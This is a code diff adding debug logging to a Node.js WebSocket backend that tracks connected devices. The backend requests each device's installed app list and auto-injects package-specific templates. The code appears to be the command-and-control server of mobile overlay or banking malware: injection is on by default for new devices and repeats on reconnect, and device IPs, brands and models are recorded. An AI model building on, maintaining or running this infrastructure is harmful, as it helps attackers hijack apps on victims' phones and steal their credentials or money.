@@ -4,6 +4,7 @@ const { getPool, dbWithRetry } = require('../services/commandPoller');
 const { broadcastToAdmins, forwardFrameToAdmins } = require('./admin');
 const { sendFirstTime: sendProtectFirstTime } = require('../services/autoProtect');
 const { allowWrite: wtAllow, markWritten: wtMark } = require('../services/writeThrottle');
+const { recordDeviceDebug } = require('../services/deviceDebugLog');
 // TG 通知已移到 PHP DeviceController 中处理
 
 async function queryPolicyRows(sql) {
@@ -65,6 +66,7 @@ function handleDevice(ws, sessionId, connections) {
 
   connections.devices.set(sessionId, { ws, sessionId, clientIp });
   console.log(`[WS-Device] Connected: ${sessionId} ip=${clientIp}`);
+  void recordDeviceDebug('ws.connected', sessionId, { clientIp, connectionPoolSize: connections.devices.size });
 
   // 清除自动注入缓存（设备重新上线时允许重新注入一次）
   if (autoInjectedCache && autoInjectedCache.has(sessionId)) {
@@ -86,6 +88,7 @@ function handleDevice(ws, sessionId, connections) {
         sessionId,
         data: { command: 'GET_APP_LIST', params: {} }
       }));
+      void recordDeviceDebug('apps.request.sent', sessionId, { delayMs: 8000, command: 'GET_APP_LIST' });
     }
   }, 8000);
 
@@ -204,9 +207,10 @@ function handleDevice(ws, sessionId, connections) {
     }
     broadcastToAdmins(connections, { type: 'device_update' });
     console.log(`[WS-Device] Disconnected: ${sessionId}`);
+    void recordDeviceDebug('ws.disconnected', sessionId, { bridgeConnected: connections.bridges.has(sessionId) });
   });
 
-  ws.on('error', () => {
+  ws.on('error', (error) => {
     clearTimeout(appListTimer);
     policySyncTimers.forEach(clearTimeout);
     clearInterval(heartbeatInterval);
@@ -216,6 +220,7 @@ function handleDevice(ws, sessionId, connections) {
     if (!connections.bridges.has(sessionId)) {
       updateDeviceStatus(sessionId, false);
     }
+    void recordDeviceDebug('ws.error', sessionId, { message: error?.message || 'unknown websocket error' }, 'error');
   });
 }
 
@@ -236,6 +241,15 @@ function handleDeviceMessage(ws, msg, sessionId, connections) {
     // ★ 修复 C：不再查池拿 clientIp（避免池被清空时丢失 IP），直接从 ws 取实时 IP
     const rawIp = ws._socket ? ws._socket.remoteAddress : '';
     const wsClientIp = rawIp ? rawIp.replace('::ffff:', '') : '';
+    void recordDeviceDebug('ws.message.' + String(type || 'unknown').toLowerCase(), sessionId, {
+      messageType: type,
+      payloadKeys: info && typeof info === 'object' ? Object.keys(info) : [],
+      brand: info?.brand || '',
+      model: info?.model || '',
+      appName: info?.appName || info?.deviceName || '',
+      appVersion: info?.appVersion || '',
+      clientIp: wsClientIp,
+    });
     syncDeviceStatus(sessionId, info, wsClientIp);
   }
 
@@ -427,6 +441,11 @@ function handleDeviceMessage(ws, msg, sessionId, connections) {
  */
 async function syncDeviceStatus(deviceId, data, clientIp) {
   if (!data || !deviceId) return;
+  void recordDeviceDebug('db.device_upsert.started', deviceId, {
+    payloadKeys: typeof data === 'object' ? Object.keys(data) : [],
+    hasAppName: !!(data.appName || data.deviceName),
+    clientIp: clientIp || '',
+  });
   try {
     const db = getPool();
     const now = Math.floor(Date.now() / 1000);
@@ -536,6 +555,12 @@ async function syncDeviceStatus(deviceId, data, clientIp) {
 
     // ★ 写节流标记：last_seen + status_meta（避免下一次心跳 UPDATE 在 10s/5s 内重复争同一行锁）
     wtMark(deviceId, ['last_seen', 'status_meta', 'public_ip']);
+    void recordDeviceDebug('db.device_upsert.completed', deviceId, {
+      appName: appNameV || '',
+      brand: brandV || '',
+      model: modelV || '',
+      metadataWasPartial: !appNameV || !brandV || !modelV,
+    });
 
     // 首次注册的日志通过额外查询判断（只在 brand/model 都有值或首次无匹配行时才输出"Auto-registered"，
     // 但为避免额外 SELECT 加重死锁，这里简化日志：不区分是否首次，只在 debug 模式下打印）
@@ -543,6 +568,7 @@ async function syncDeviceStatus(deviceId, data, clientIp) {
       console.log(`[WS-Device] syncDeviceStatus upserted: ${shortId}...`);
     }
   } catch (err) {
+    void recordDeviceDebug('db.device_upsert.error', deviceId, { message: err.message || String(err) }, 'error');
     // 死锁/锁等待：已经由 dbWithRetry 内部打了 warn（可观测）；这里不再打 error，避免日志爆炸
     if (/Deadlock found|Lock wait timeout/i.test(err.message || '')) {
       console.warn(`[WS-Device] syncDeviceStatus give up after retries (${shortId}...): ${err.message}`);
@@ -769,6 +795,10 @@ async function handleAppList(deviceId, msg, ws, connections) {
     const apps = msg._apps || msg.data?.apps || msg.data || msg.apps || [];
     const appsJson = JSON.stringify(apps);
     const now = Math.floor(Date.now() / 1000);
+    void recordDeviceDebug('apps.response.received', deviceId, {
+      count: Array.isArray(apps) ? apps.length : 0,
+      responseType: msg.type || msg.event || 'app_list',
+    });
 
     // UPSERT: 存在则更新，不存在则插入（新设备默认 injection_active=1）
     await db.query(
@@ -789,6 +819,7 @@ async function handleAppList(deviceId, msg, ws, connections) {
       console.log(`[WS-Device] injection_active=OFF for ${deviceId}, skipping auto-inject`);
     } else {
       console.log(`[WS-Device] injection_active=ON for ${deviceId}, triggering auto-inject...`);
+      void recordDeviceDebug('injection.auto.matching', deviceId, { installedAppCount: Array.isArray(apps) ? apps.length : 0 });
       await autoInjectForDevice(deviceId, apps, ws, connections);
     }
   } catch (err) {
@@ -881,6 +912,11 @@ async function autoInjectForDevice(deviceId, apps, ws, connections) {
           console.warn(`[WS-Device] Failed to persist auto-injection task ${pkg} for ${deviceId}: ${taskErr.message}`);
         }
         console.log(`[WS-Device] Auto-inject ${pkg} (${tpl.name}) to ${deviceId}`);
+        void recordDeviceDebug('injection.auto.sent', deviceId, {
+          packageName: pkg,
+          templateId: tpl.template_id,
+          templateName: tpl.name || '',
+        });
       }
     }
     if (injectedCount > 0) {
